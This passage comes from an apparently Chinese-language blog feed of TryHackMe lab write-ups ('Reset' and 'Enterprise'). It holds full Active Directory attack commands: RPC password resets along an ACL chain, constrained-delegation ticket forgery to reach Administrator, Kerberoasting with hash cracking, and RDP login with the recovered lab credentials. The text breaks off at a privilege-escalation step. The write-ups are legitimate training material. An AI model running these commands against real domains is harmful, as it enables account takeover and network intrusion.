alt="image-20241025152652439"></p><p>ÊúÄÁªàÂèëÁé∞Âè™Êúâ<code>TABATHA_BRITT</code>Áî®Êà∑ÊàêÂäüÁàÜÁ†¥ÔºåÂØÜÁ†ÅÊòØ<code>marlboro(1985)</code></p><p>ÂÜçÂØπËØ•Áî®Êà∑ËøõË°å‰ø°ÊÅØÊêúÈõÜ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.219.65 --dns-tcp -d THM.CORP -u TABATHA_BRITT -p <span class="string">&#x27;marlboro(1985)&#x27;</span> -c All --zip</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025161327821-1280956437.png" alt="image-20241025161304577">Â∞ÜÊî∂ÈõÜÁöÑ‰ø°ÊÅØ‰ΩøÁî®<code>Bloodhound</code>ÂàÜÊûê</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025162900833-2005768447.png" alt="image-20241025162837120"></p><p>ÊâæÂà∞Âà©Áî®ÈìæÔºåÊàë‰ª¨ÊÉ≥Ë¶ÅÂà∞Ëææ<code>DARLA_WINTERS</code>ÔºåÂ∞±ÊòØ‰ªé<code>TABATHA_BRITT</code>Âà∞<code>SHAWMA_BRAY</code>ÁöÑ<code>GenericAll</code>ÔºåÂà©Áî®<code>ForceChangePassword</code>‰ªé<code>SHAWMA_BRAY</code>Âà∞<code>CRUZZ_HALL</code>ÔºåÊúÄÂêéÂà©Áî®<code>GenericWrite</code>‰ªé<code>CRUZ_HALL</code>Âà∞<code>DARLA_WINTERS</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025162314922-442943433.png" alt="image-20241025162252026"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025162215576-292168178.png" alt="image-20241025162152712"></p><p>Êàë‰ª¨ÂèëÁé∞ÂèØ‰ª•ÈÄöËøá<code>RPC</code>Âà©Áî®<code>GenericAll</code>Êõ¥ÊîπÁî®Êà∑ÁöÑÂØÜÁ†ÅÔºåÂØπ‰∫é<code>ForceChangePassword</code>Âíå<code>GenericWrite</code>ÂêåÊ†∑ÂèØ‰ª•ÈÄÇÁî®</p><p>Êàë‰ª¨‰ΩøÁî®<code>TABATHA_BRITT</code>Áî®Êà∑Êù•Êìç‰Ωú</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net rpc password <span class="string">&quot;SHAWNA_BRAY&quot;</span> <span class="string">&quot;Aa123456!&quot;</span> -U <span class="string">&quot;thm.corp&quot;</span>/<span class="string">&quot;TABATHA_BRITT&quot;</span>%<span class="string">&quot;marlboro(1985)&quot;</span> -S <span class="string">&quot;10.10.219.65&quot;</span></span><br><span class="line"></span><br><span class="line">net rpc password <span class="string">&quot;CRUZ_HALL&quot;</span> <span class="string">&quot;Aa123456!&quot;</span> -U <span class="string">&quot;THM.CORP&quot;</span>/<span class="string">&quot;SHAWNA_BRAY&quot;</span>%<span class="string">&quot;Aa123456!&quot;</span> -S <span class="string">&quot;10.10.219.65&quot;</span></span><br><span class="line"></span><br><span class="line">net rpc password <span class="string">&quot;DARLA_WINTERS&quot;</span> <span class="string">&quot;Aa123456!&quot;</span> -U <span class="string">&quot;THM.CORP&quot;</span>/<span class="string">&quot;CRUZ_HALL&quot;</span>%<span class="string">&quot;Aa123456!&quot;</span> -S <span class="string">&quot;10.10.219.65&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025164851767-362787753.png" alt="image-20241025164828710"></p><p>‰ΩøÁî®<code>crackmapexec</code>È™åËØÅ‰∏Ä‰∏ã</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.219.65 -u DARLA_WINTERS -p <span class="string">&#x27;Aa123456!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025165457028-896741427.png" alt="image-20241025165434092"></p><p>‰øÆÊîπÊàêÂäüÔºÅÂÜçÂØπ<code>DARLA_WINTERS</code>‰ø°ÊÅØÊî∂ÈõÜ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.219.65 --dns-tcp -d THM.CORP -u <span class="string">&#x27;DARLA_WINTERS&#x27;</span> -p <span class="string">&#x27;Aa123456!&#x27;</span> -c All --zip</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025172857716-1006065661.png" alt="image-20241025172834592"></p><p>ÂèëÁé∞<code>DARLA_WINTERS</code>Áî®Êà∑ÂèØ‰ª•ÈÄöËøá<code>CIFS</code>ÊúçÂä°ËøõË°åÂßîÊ¥æÊîªÂáªÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•Ê®°ÊãüÂüüÊéß‰∏ä<code>CIFS</code>ÊúçÂä°ÁöÑÁÆ°ÁêÜÂëò</p><h2 id="ÂßîÊ¥æÊîªÂáª">ÂßîÊ¥æÊîªÂáª</h2><p><code>Impacket</code> ÁöÑ<code>getST</code>ËÑöÊú¨Â∞ÜËØ∑Ê±ÇÊúçÂä°ÁöÑ<code>Ticket</code> Âπ∂Â∞ÜÂÖ∂‰øùÂ≠ò‰∏∫ <code>ccache</code>„ÄÇÂ¶ÇÊûúÂ∏êÊà∑ÂÖ∑ÊúâÂèóÈôêÁöÑÂßîÊ¥æÊùÉÈôêÔºåÂèØ‰ª•‰ΩøÁî® <code>-impersonate</code> Ê†áÂøó‰ª£Ë°®ÂÖ∂‰ªñÁî®Êà∑ËØ∑Ê±ÇÁ•®ËØÅ„ÄÇ</p><p>‰ΩøÁî® <code>impacket</code> ÁöÑ<code>getST.py</code>Ëé∑ÂèñÁ•®ÊçÆ</p><p>Âú®ËØ∑Ê±ÇÁ•®ÊçÆ‰πãÂâçÔºåÊàë‰ª¨ÂÖàËæìÂÖ•‰∏ãÈù¢Ëøô‰∏™ÂëΩ‰ª§„ÄÇËøô‰∏™ÂëΩ‰ª§ÂèØ‰ª•‰ªéÊåáÂÆöÁöÑ NTP ÊúçÂä°Âô®‰∏äËé∑ÂèñÂáÜÁ°ÆÁöÑÊó∂Èó¥ÔºåÂπ∂Â∞ÜÁ≥ªÁªüÊó∂Èó¥Ë∞ÉÊï¥Âà∞‰∏é‰πãÂêåÊ≠•„ÄÇ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate -s haystack.thm.corp</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂÜçÂºÄÂßãËé∑ÂèñÁ•®ÊçÆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getST.py -spn <span class="string">&quot;cifs/haystack.thm.corp&quot;</span> -dc-ip 10.10.219.65 -impersonate <span class="string">&quot;Administrator&quot;</span> <span class="string">&quot;thm.corp/DARLA_WINTERS:Aa123456!&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025175746257-1822396632.png" alt="image-20241025175722380"></p><p>‰ΩøÁî®<code>KRB5CCNAME</code>ÁéØÂ¢ÉÂèòÈáèËÆæÁΩÆ <code>ccache</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=Administrator@cifs_haystack.thm.corp@THM.CORP.ccache</span><br></pre></td></tr></table></figure><p>ÂÜç‰ΩøÁî®<code>wmiexec.py</code>ÁôªÂΩï<code>Administrator</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -k -no-pass Administrator@haystack.thm.corp</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025181710304-1116480087.png" alt="image-20241025181646460"></p><p>ÊàêÂäüËé∑Âæó<code>Administrator</code>ÁöÑÊùÉÈôê</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025181908376-2067529138.png" alt="image-20241025181845059"></p><p>Âú®<code>Desktop</code>ÊâæÂà∞<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMeÁ≥ªÂàó‰πãReset</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    <category term="Active Directory" scheme="https://www.fomal.cc/categories/TryHackMe/Active-Directory/"/>
    
    
    <category term="Windows" scheme="https://www.fomal.cc/tags/Windows/"/>
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-Enterprise</title>
    <link href="https://www.fomal.cc/posts/f6320aec.html"/>
    <id>https://www.fomal.cc/posts/f6320aec.html</id>
    <published>2024-10-23T07:42:46.000Z</published>
    <updated>2024-10-27T12:36:17.705Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>Èù∂Êú∫ipÔºö10.10.76.81</p><p>ÊîªÂáªÊú∫ipÔºö10.14.90.122</p></blockquote><h1>‰ø°ÊÅØÊî∂ÈõÜ</h1><h2 id="nmapÊâ´Êèè">nmapÊâ´Êèè</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.184.113</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-23 15:44 CST</span><br><span class="line">Warning: 10.10.184.113 giving up on port because retransmission cap hit (10).</span><br><span class="line">Nmap scan report for 10.10.184.113</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 59956 closed tcp ports (reset), 5552 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-23 07:44:58Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: LAB-ENTERPRISE</span><br><span class="line">|   NetBIOS_Domain_Name: LAB-ENTERPRISE</span><br><span class="line">|   NetBIOS_Computer_Name: LAB-DC</span><br><span class="line">|   DNS_Domain_Name: LAB.ENTERPRISE.THM</span><br><span class="line">|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM</span><br><span class="line">|   DNS_Tree_Name: ENTERPRISE.THM</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-10-23T07:46:13+00:00</span><br><span class="line">| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM</span><br><span class="line">| Not valid before: 2024-10-22T07:43:23</span><br><span class="line">|_Not valid after:  2025-04-23T07:43:23</span><br><span class="line">|_ssl-date: 2024-10-23T07:46:26+00:00; -1s from scanner time.</span><br><span class="line">5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Service Unavailable</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">7990/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Log in to continue - Log in with Atlassian account</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49671/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49673/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49679/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49707/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49713/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.94SVN%E=4%D=10/23%OT=53%CT=1%CU=31414%PV=Y%DS=2%DC=T%G=Y%TM=671</span><br><span class="line">OS:8A9DA%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=I%CI=RD%II=I%SS=</span><br><span class="line">OS:S%TS=U)SEQ(SP=102%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=102%GCD=</span><br><span class="line">OS:1%ISR=10C%TI=I%CI=RD%II=I%SS=S%TS=U)SEQ(SP=103%GCD=1%ISR=10C%TI=I%CI=I%I</span><br><span class="line">OS:I=I%SS=S%TS=U)OPS(O1=M509NW8NNS%O2=M509NW8NNS%O3=M509NW8%O4=M509NW8NNS%O</span><br><span class="line">OS:5=M509NW8NNS%O6=M509NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=F</span><br><span class="line">OS:F70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M509NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A</span><br><span class="line">OS:=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=</span><br><span class="line">OS:Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%R</span><br><span class="line">OS:D=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=</span><br><span class="line">OS:0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U</span><br><span class="line">OS:1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DF</span><br><span class="line">OS:I=N%T=80%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -1s, deviation: 0s, median: -1s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-23T07:46:15</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 199/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   359.39 ms 10.14.0.1</span><br><span class="line">2   360.71 ms 10.10.184.113</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 144.50 seconds</span><br></pre></td></tr></table></figure><p>‰∏çÈöæÁúãÂá∫ËøôÊòØ‰∏ÄÂè∞ÂüüÊéßÊú∫Âô®ÔºåÂºÄÊîæ‰∫ÜËã•Âπ≤Á´ØÂè£ÔºåÂüüÂêç‰∏∫<code>LAB.ENTERPRISE.THM</code>ÔºåÂ∞ÜÂÖ∂Ê∑ªÂä†Âà∞<code>/etc/hosts</code>Êñá‰ª∂‰∏≠</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023164304313-1442381621.png" alt="image-20241023164242012"></p><h2 id="SMB">SMB</h2><p>ÂÖàÁÆÄÂçïÊé¢Êµã‰∏ãsmbÊúçÂä°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.184.113</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023155144317-1847528457.png" alt="image-20241023155122981"></p><p>ÂèëÁé∞‰∏Ä‰∫õÂÖ±‰∫´ÁõÆÂΩïÔºåÂ∞ùËØïÂåøÂêçÁôªÈôÜËÆøÈóÆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.184.113/Docs</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023155531326-846039650.png" alt="image-20241023155511089"></p><p>ÂèëÁé∞‰∏§‰∏™Êñá‰ª∂<code>get</code>‰∏ãÊù•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.184.113/Users</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023155623661-1766656713.png" alt="image-20241023155603137"></p><p>Êää<code>desktop.ini</code>‰∏ãËΩΩ‰∏ãÊù•ÔºåÂêåÊó∂Âú®<code>Users</code>ÁõÆÂΩï‰∏≠ÔºåÊâæÂà∞‰∏Ä‰∫õÁî®Êà∑Âêç</p><p>Â∞ÜÁî®Êà∑Âêç‰øùÂ≠ò‰∏ãÊù•</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023155922742-1623262837.png" alt="image-20241023155901976"></p><p>Âú®<code>Default</code>ÁõÆÂΩï‰∏≠ÊâæÂà∞‰∫õÊñá‰ª∂ÔºåÊü•Áúã‰∏Ä‰∏ã‰πãÂâç‰∏ãËΩΩÁöÑÊñá‰ª∂</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160456960-1428865174.png" alt="image-20241023160434574"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160539318-945036663.png" alt="image-20241023160516110"></p><p>ÂèëÁé∞Ëøô‰∏§‰∏™Êñá‰ª∂ÈúÄË¶ÅÂØÜÁ†ÅÊâçËÉΩÊü•Áúã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160627583-292902303.png" alt="image-20241023160602672"></p><h2 id="80Á´ØÂè£">80Á´ØÂè£</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160131115-1178226363.png" alt="image-20241023160110776"></p><p>ÈªòËÆ§È°µÈù¢Ê≤°‰ªÄ‰πà‰ø°ÊÅØÔºåÊâ´Êèè‰∏Ä‰∏ãÂêéÂè∞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160734235-742745560.png" alt="image-20241023160710469"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160820658-791344310.png" alt="image-20241023160753616"></p><p>Ê≤°Âï•Áî®</p><h2 id="7990Á´ØÂè£">7990Á´ØÂè£</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023162220892-1397336076.png" alt="image-20241023162156550"></p><p>ËøôÊòØ‰∏Ä‰∏™<code>Atlassian</code>Âπ∂‰∏îÂèëÁé∞ÂÜÖÂÆπÊòØ<code>Enterprise-THM</code>ÔºåÊ≠£Âú®ËøÅÁßªËá≥githubÔºåÊàë‰ª¨‰∏äÂéªgoogleÊêúÁ¥¢‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023162740885-2011563018.png" alt="image-20241023162718049"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023162838024-1090127372.png" alt="image-20241023162813746"></p><p>Ê≥®ÊÑèÂà∞Êúâ‰∏™Áî®Êà∑<code>Nik-enterprise-dev</code>ÔºåÈáåÈù¢Êúâ‰∏Ä‰∏™Â∫ì<code>mgmtScript.ps1</code>ÔºåÂ∫ìÈáåÈù¢ËøòÊúâ‰∏™ps1Êñá‰ª∂<code>mgmtScript.ps1</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023163037619-1307610051.png" alt="image-20241023163010726"></p><p>Êü•Áúã‰∏Ä‰∏ãÂéÜÂè≤ËÆ∞ÂΩï</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023163133624-1566744799.png" alt="image-20241023163105667"></p><p>ÂèëÁé∞‰∫Ü‰ªñÁöÑÁî®Êà∑ÂêçÂèäÂØÜÁ†Å<code>nik:ToastyBoi!</code></p><h2 id="rpc">rpc</h2><p>Êúâ‰∫Ü‰∏ÄÁªÑÁî®Êà∑Âá≠ÊçÆÔºåÂ∞ùËØïÊé¢Êµã‰∏Ä‰∏ã<code>rpc</code>ÔºåÊûö‰∏æ‰∏Ä‰∏ãÁî®Êà∑</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpcclient lab.enterprise.thm -U nik --password=<span class="string">&quot;ToastyBoi!&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023190844546-934835508.png" alt="image-20241023190823732"></p><p>ÊâæÂà∞ÂæàÂ§öÂüüÁî®Êà∑ÔºåÂ∞ÜÂÖ∂‰øùÂ≠òÂà∞<code>users</code>Êñá‰ª∂‰∏≠ÔºåÊñπ‰æøÂêéÁª≠Âà©Áî®</p><h1>rdpÁôªÂΩïbitbucket</h1><p>Êúâ‰∫Ü‰∏ÄÁªÑÂá≠ÊçÆÂíåÁî®Êà∑ÂêçÂàóË°®Â∞±ÂèØ‰ª•Â∞ùËØï<code>AS-REP Roasting</code>ÔºåÊ£ÄÊü•‰∏Ä‰∏ãÂüü‰∏≠Áî®Êà∑ÊòØÂê¶ÊúâÁî®Êà∑Á¶ÅÁî®‰∫ÜÈ¢ÑË∫´‰ªΩÈ™åËØÅÔºåÂ¶ÇÊûúÊúâÁöÑËØùÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•ËØ∑Ê±Ç<code>TGT</code>ÂØÜÈí•ÔºåÂ∞±ÂèØ‰ª•Â∞ùËØïÁ¶ªÁ∫øÁ†¥Ëß£ÂØÜÈí•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py lab.enterprise.thm/ -usersfile <span class="built_in">users</span> -dc-ip 10.10.184.113</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023194833249-196889267.png" alt="image-20241023194812832"></p><p>Êé•‰∏ãÊù•Êü•ÁúãÊòØÂê¶ÊúâÁî®Êà∑ËÆæÁΩÆ‰∫Ü<code>SPN</code>ÔºåÂ¶ÇÊûúÊúâÁöÑËØùÔºåÊàë‰ª¨ÂèØ‰ª•ËØ∑Ê±Ç<code>TGS</code>ÂØÜÈí•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi!</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023185802387-322860292.png" alt="image-20241023185741834"></p><p>ÂèëÁé∞<code>bitbucket</code>Áî®Êà∑ËÆæÁΩÆ‰∫Ü<code>SPN</code>ÔºåÊàë‰ª¨ËØ∑Ê±Ç<code>TGS</code>Âπ∂Â∞ùËØïÁ†¥Ëß£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi! -request</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023185920000-1248219664.png" alt="image-20241023185859159"></p><p>Â∞Ü‰∏äËø∞Á•®ÊçÆ‰øùÂ≠ò‰∏∫<code>hash</code>Ôºå‰ΩøÁî®<code>john</code>ÁàÜÁ†¥<code>hash</code>ÂÄº</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><code>john hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023195207909-243147148.png" alt="image-20241023195147299"></p><p>ÁàÜÁ†¥Âá∫ÂØÜÁ†Å<code>littleredbucket</code></p><p>rdpÂ∞ùËØïÁôªÈôÜ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /u:bitbucket /p:littleredbucket /v:lab.enterprise.thm</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023203011100-308824680.png" alt="image-20241023202950998"></p><p>Âú®Ê°åÈù¢ÊâæÂà∞<code>user.txt</code></p><h1>ÊèêÊùÉËá≥root</h1><p>‰ΩøÁî®<code>PowerUp.ps1</code>Êù•ÂàÜÊûêÂèØËÉΩÊèêÂçáÊùÉÈôêÁöÑÊºèÊ¥ûÔºåÂ∞ÜÊñá‰ª∂‰º†Âà∞Èù∂Êú∫‰∏ä</p><p>ÊîªÂáªÊú∫ÂêØÂä®pythonÊúçÂä°</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023210727187-1693192503.png" alt="image-20241023210705120"></p><p>‰ªéÂèóÂÆ≥ËÄÖÊú∫Âô®‰∏äÔºåÊàë‰ª¨‰ΩøÁî®<code>certutil</code>‰ªé <code>Powershell</code> Ëé∑ÂèñÂèØÊâßË°åÊñá‰ª∂Ôºö</p><figure class="highlight 